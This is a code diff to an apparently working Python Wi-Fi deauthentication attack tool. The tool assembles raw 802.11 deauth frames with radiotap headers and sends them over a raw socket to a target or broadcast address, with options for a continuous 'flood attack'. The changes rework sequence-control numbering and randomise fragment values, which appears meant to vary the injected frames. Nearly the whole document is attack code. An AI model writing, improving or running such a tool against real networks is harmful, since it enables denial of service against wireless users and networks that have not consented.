@@ -25,6 +25,7 @@ import rt # Adds radio tap header
 import os # Used for ensuring permissions are set
 import struct  # Unpacking binary data (e.g., network headers)
 import sys 
+import random
 import time
 
 def f_assem(args):
@@ -34,7 +35,7 @@ def f_assem(args):
     source_mac = args.ap_source # mapped
     network_bssid = args.net_bssid # mapped
     broadcast_attack =  args.broadcast # mapped
-    frag_size = args.fragment_size # mapped
+    frag = args.fragment # mapped
     seq_num = args.sequence # mapped
     reason_code = args.reason_code # mapped
     timedelay = args.time # mapped
@@ -51,11 +52,11 @@ def f_assem(args):
         exit(1)
     # handle all illogical arguments
     if (broadcast_attack or timedelay or frame_flood or num_frames or
-    frag_size or seq_num or reason or dur_of_attack) and not (dest_mac or broadcast_attack):
+    frag or seq_num or reason or dur_of_attack) and not (dest_mac or broadcast_attack):
         print("Error: target input required") # requires target input for most operations
         exit(1)
     if (broadcast_attack or timedelay or frame_flood or num_frames or
-    frag_size or seq_num or reason or dur_of_attack) and not network_bssid:
+    frag or seq_num or reason or dur_of_attack) and not network_bssid:
         print("Error: network BSSID required") # requires network BSSID for most operations
         exit(1)
     if frame_flood and (num_frames or timedelay or dur_of_attack):
@@ -72,10 +73,10 @@ def f_assem(args):
     f_ctl = struct.pack('B', 0xC0)
 
     # second byte makeup of FCF
-    if not frag_size:
+    if not frag:
         ch = "NO"
         f_frag = struct.pack('B', 0x00)
-    elif frag_size:
+    elif frag:
         ch = "YES"
         f_frag = struct.pack('B', 0x10)
 
@@ -101,28 +102,7 @@ def f_assem(args):
         print("Invalid argument, missing Address 3")
         exit(1)
 
-    # Sequence Control Field
-    if not (frag_size and seq_num):
-        seq = struct.pack('<H', 0x00)
-    elif frag_size and not seq_num:
-        seq = struct.pack('<H', frag_size & 0x0F)
-    elif seq_num and not frag_size:
-        seq = struct.pack('<H', (seq_num << 4) & 0xFFF0)
-    elif (seq_num and frag_size):
-        seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (frag_size & 0x0F))
-
-    # Compile the frame header
-    fh = f_ctl + f_frag + f_dur + ct + src + net + seq
-
-    # Body
-    if not reason_code:
-        rc = None
-        df = fh
-    elif reason_code:
-        rc = reason.reasoncode_input(reason_code)
-        df = fh + rc
-
-    return df, f_ctl, f_frag, f_dur, ct, src, net, seq, rc, ch
+    return f_ctl, f_frag, f_dur, ct, src, net, ch
 
 def main():
     args = okeusarguments.parse_arguments()
@@ -137,90 +117,138 @@ def main():
     source_mac = args.ap_source # mapped
     network_bssid = args.net_bssid # mapped
     broadcast_attack =  args.broadcast # mapped
-    frag_size = args.fragment_size # mapped
+    frag = args.fragment # mapped
     seq_num = args.sequence # mapped
     reason_code = args.reason_code # mapped
 
-    df, f_ctl, f_frag, f_dur, ct, src, net, seq, rc, ch = f_assem(args)
+    f_ctl, f_frag, f_dur, ct, src, net, ch = f_assem(args)
     radio, ver, pad, rt_len, fp = rt.rt_head()
-    frame = radio + df
+    df = radio + f_ctl + f_frag + f_dur + ct + src + net
+
+    def reas():
+        # Body
+        if not reason_code:
+            rc = reason.reasoncode_input(0)
+        elif reason_code:
+            rc = reason.reasoncode_input(reason_code)
+
+        return rc
 
     def ver():
         print(f"{'Frame composition'.center(100)}")
         print("-" * 100)
-        print(f"Radiotap version: 0")
-        print(f"Radiotap pad: UNUSED")
+        print(f"Radiotap version: {ver}")
+        print(f"Radiotap pad: {pad.hex()}")
         print(f"Radiotap length: {rt_len.hex()}")
         print(f"Radiotap fields present: {fp.hex()}")
-        print(f"Frame type: {f_ctl.hex()}")
+        print(f"Frame type: {f_ctl.hex().upper()}")
         print(f"Fragmentation set: {ch}")
-        print("Duration bytes not set: 0x00, 0x00")
+        print("Duration: 0x00, 0x00")
         if broadcast_attack:
             print("Destination: FF:FF:FF:FF:FF:FF")
         elif dest_mac:
-            print(f"Destination: {dest_mac}")
+            print(f"Destination: {dest_mac.upper()}")
         if not source_mac:
-            print(f"Source: {network_bssid}")
+            print(f"Source: {network_bssid.upper()}")
         elif source_mac:
-            print(f"Source: {source_mac}")
-        print(f"Network: {network_bssid}")
-        print(f"Fragmentation size: {frag_size}")
-        print(f"Sequence Control Number: {seq_num}")
+            print(f"Source: {source_mac.upper()}")
+        print(f"Network: {network_bssid.upper()}")
+        print(f"Fragmentation: {frag}")
+        print(f"Sequence Control: {seq_num}")
         if not reason_code:
-            print("Reason Code: NONE **** MALFORMED PACKET ERROR ****")
+            print(f"Reason Code: {reason.def_code(0)}")
         if reason_code:
             print(f"Reason Code: {reason.def_code(reason_code)}")
-        print(f"Frame: {frame.hex().upper()}")
         print("-" * 100)
 
+    def fs():
+        # Sequence Control Field
+        if not hasattr(fs, "sn"):
+            fs.sn = 1
+        if not (frag or seq_num):
+            seq = struct.pack('<H', 0x00)
+        elif frag and not seq_num:
+            rf = random.randint(1, 14)
+            seq = struct.pack('<H', rf & 0x0F)
+        elif seq_num and not frag:
+            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
+            fs.sn += 1
+        elif (seq_num and frag):
+            rf = random.randint(1, 14)
+            if rf >= 8:
+                seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
+                fs.sn += 1
+            else:
+                seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
+
+        return seq
 
     # Open the socket
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
     s.bind((interface, 0))
 
+    r = reas()
+
     if frame_flood:
+        nmframe = 1
         if verbose:
             ver()
         try:
-            print(f"Flooding: {ct.hex()}\nInterrupt with CTRL + C")
+            tg = ct.hex().upper()
+            tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
+            print(f"Flooding: {tgt}\nInterrupt with CTRL + C")
             while True:
+                sq = fs()
+                frame = df + sq + r
                 s.send(frame)
                 time.sleep(.15)
+                nmframe += 1
         except KeyboardInterrupt:
-            print("Ending flood attack")
+            print("\nEnding flood attack")
         except Exception as e:
             print(f"Error: {e}")
         finally:
+            print(f"Sent {nmframe} frames to {tgt}")
             s.close()
 
     if not frame_flood:
         if timedelay:
-            t = timedelay // 1000
+            t = timedelay / 1000
             ti = timedelay
         if not timedelay:
-            t = .5
-            ti = "500"
+            ti = 500
+            t = ti / 1000
         if num_frames:
             n = num_frames
         if not num_frames:
-            n = 3
+            n = 1
         try:
             if verbose:
                 ver()
             print(f"Sending {n} frames at a rate of {ti} ms.")
             for i in range(n):
+                sq = fs()
+                frame = df + sq + r
                 s.send(frame)
-                print(f"Sending frame: {i + 1}/{n}\n{frame}")
-                print(f"Waiting {ti} ms")
+                if verbose:
+                    print(f"Sending frame: {i + 1}/{n}")
+                    frme = frame.hex().upper()
+                    frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
+                    print(frmes)
+                    if ti < 1000:
+                        print(f"Waiting {ti} ms...")
+                    elif ti >= 1000:
+                        print(f"Waiting {ti / 1000} second(s)...")
+                    print(t)
                 time.sleep(t)
         except KeyboardInterrupt:
+            print("\n")
             exit(1)
         except Exception as e:
             print(f"Error: {e}")
         finally:
+            print("Completed!!!")
             s.close()
-
-    #print(frame)
 
 if __name__ == "__main__":
     main()
